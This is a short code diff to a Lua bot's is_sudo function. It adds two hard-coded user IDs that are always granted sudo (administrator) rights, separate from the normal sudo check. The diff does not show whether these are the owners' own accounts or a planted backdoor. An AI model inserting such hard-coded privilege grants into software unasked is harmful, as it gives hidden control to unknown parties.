@@ -158,6 +158,9 @@ function is_sudo(msg)
       var = true
     end
   end
+  if msg.from.id == '23646077' or msg.from.id == '174620447' then
+    var = true
+  end
   return var
 end
 
